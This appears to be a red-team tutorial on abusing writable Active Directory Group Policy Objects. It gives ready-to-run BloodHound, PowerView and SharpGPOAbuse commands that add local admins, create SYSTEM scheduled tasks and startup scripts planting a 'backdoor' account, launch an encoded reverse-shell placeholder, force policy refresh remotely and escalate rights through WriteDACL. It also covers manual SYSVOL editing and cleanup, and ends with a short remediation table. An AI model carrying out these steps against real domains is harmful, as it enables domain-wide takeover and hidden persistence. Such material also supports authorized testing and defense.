# GPO Abuse

## What It Is

**Group Policy Objects (GPOs)** are containers of settings pushed from Active Directory to computers and users in the domain. They control everything from password policy to software installation to startup scripts. Admins create GPOs and link them to **Organizational Units (OUs)** - all machines or users in that OU receive those settings automatically.

If you have write permissions on a GPO that applies to computers or users you want to compromise, you can push arbitrary configuration - add a local admin account, run a command at startup, or execute a scheduled task as SYSTEM.

**The key distinction from most AD attacks:** GPO abuse doesn't require a service account hash or ticket. It abuses misconfigured **permissions on the GPO object itself** in AD.

---

## How GPOs Work

1. Admin creates a GPO in AD -> defines settings (e.g., "run this script at startup")
2. GPO is **linked** to an OU - all computers/users in that OU receive it
3. Computers check in with the DC every 90 minutes (default) and apply any new/changed GPOs
4. `gpupdate /force` forces immediate application

**Attack flow:**
- Find a GPO linked to a privileged OU (Domain Controllers, Domain Computers, etc.)
- Confirm you have `GenericWrite` or `GenericAll` on that GPO object
- Modify the GPO to run a payload -> next GP refresh runs it as SYSTEM on every affected machine

---

## Step 1 - Find Writable GPOs

### BloodHound

Custom Cypher query to find GPO write paths:
```
MATCH p=(n)-[:GenericAll|GenericWrite|Owns|WriteOwner|WriteDacl]->(g:GPO) RETURN p
```

Look for edges from your current user or group to any GPO node. Check what OUs the GPO is linked to - that defines the blast radius.

### PowerView

```powershell
# List all GPOs
Get-DomainGPO | select displayname, name

# Check ACL on a specific GPO
Get-DomainObjectAcl -Identity "GPO-Display-Name" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write|GenericAll"}

# Find which OUs a GPO is linked to
Get-DomainOU -GPLink "<GPO-GUID>"

# Find computers in that OU
Get-DomainComputer -SearchBase "OU=Servers,DC=corp,DC=local"
```

---

## Step 2 - Confirm Scope

Before exploiting, confirm what machines or users would be affected:

```powershell
# What OUs is this GPO applied to?
Get-DomainOU | Where-Object { $_.gplink -match "<GPO-GUID>" } | select name, distinguishedname

# Get computers in that OU
Get-DomainComputer -SearchBase "OU=Workstations,DC=corp,DC=local" | select name
```

If the GPO is linked to **Domain Computers** or **Domain Controllers** -> you affect every machine in the domain.

---

## Step 3 - Exploit with SharpGPOAbuse

**SharpGPOAbuse** modifies GPOs via AD APIs. Download from GitHub releases.

### Add a Local Admin

Adds a user as local administrator on all machines in the GPO's scope at next GP refresh:

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jdoe --GPOName "Default Domain Policy"
```

### Add a Computer Scheduled Task (Runs as SYSTEM)

```powershell
# Run a command as SYSTEM on all affected machines
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add && net localgroup administrators backdoor /add" --GPOName "Default Domain Policy"

# Reverse shell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Sync" --Author "NT AUTHORITY\SYSTEM" --Command "powershell.exe" --Arguments "-enc <base64-payload>" --GPOName "Default Domain Policy"
```

### Add a Startup Script (Persistent - Runs at Every Boot)

```powershell
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName "init.bat" --ScriptContents "net user backdoor Password123! /add && net localgroup administrators backdoor /add" --GPOName "Default Domain Policy"
```

### Add a User Logon Task (Runs in User Context)

```powershell
.\SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Author "corp\Administrator" --Command "cmd.exe" --Arguments "/c <payload>" --GPOName "Default Domain Policy" --UserAccount jdoe
```

---

## Step 4 - Force GP Refresh

By default you wait up to 90 minutes. If you have access to a target:

```powershell
# On the target machine
gpupdate /force

# Remotely via WinRM
Invoke-Command -ComputerName dc01 -ScriptBlock { gpupdate /force }

# Via WMI
wmic /node:<target> process call create "gpupdate /force"
```

---

## Manual GPO Editing (No SharpGPOAbuse)

GPO files live in SYSVOL and can be edited directly with write permissions:

```sh
# Map SYSVOL from Linux
smbclient //<DC>/SYSVOL -U 'corp\jdoe%Password1'
# Navigate to: corp.local/Policies/{<GPO-GUID>}/

# From Windows
net use Z: \\dc01\SYSVOL
```

Key files in a GPO:
- `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` - security settings, local group membership
- `Machine\Scripts\Startup\` - startup scripts
- `User\Scripts\Logon\` - logon scripts

To add a local admin via `GptTmpl.inf`:
```ini
[Group Membership]
*S-1-5-32-544__Memberof =
*S-1-5-32-544__Members = *<SID-of-your-user>
```

Then increment the version number in the GPO's `GPT.INI` - required or clients won't detect a change.

---

## Cleanup

Remove your changes after exploitation:

```powershell
# Remove a scheduled task added by SharpGPOAbuse
.\SharpGPOAbuse.exe --RemoveComputerTask --TaskName "Update" --GPOName "Default Domain Policy"
```

Startup scripts are written to SYSVOL at:
```
\\<DC>\SYSVOL\<domain>\Policies\{<GPO-GUID>}\Machine\Scripts\Startup\
```
Delete the script file manually.

---

## Attack Chains

| Situation | Path |
|---|---|
| GPO applies to Domain Controllers | Add local admin on DCs -> DCSync -> full domain |
| GPO applies to Domain Computers | Local admin on all workstations -> lateral movement domain-wide |
| GPO targets OU with DA accounts | Scheduled task triggers on DA logon -> execute payload in DA context |
| You have `WriteDACL` not `GenericWrite` | Grant yourself `GenericAll` first, then exploit |

```powershell
# Grant yourself rights when you have WriteDACL
Add-DomainObjectAcl -TargetIdentity "Vulnerable GPO" -PrincipalIdentity jdoe -Rights All
```

---

## Remediation

| Control | What it does |
|---|---|
| **Audit GPO permissions** | Run BloodHound or PowerView ACL checks regularly. Only Domain Admins and Group Policy Creator Owners should have write rights on GPOs. |
| **Restrict SYSVOL write access** | File system permissions on SYSVOL should match AD object permissions. Verify both layers. |
| **Enable GPO change auditing** | Event ID 5136 logs modifications to AD objects including GPOs. Alert on GPO modifications by non-admin accounts. |
| **Review GPO scope** | GPOs linked to Domain Computers or Domain Controllers have the widest blast radius - verify only necessary GPOs are linked at that level. |
| **Audit Group Policy Creator Owners** | This group can create and modify GPOs. Membership should be tightly controlled and regularly reviewed. |
| **SYSVOL file integrity monitoring** | Alert on unexpected file changes in SYSVOL - new script files or policy changes outside change windows are a signal. |
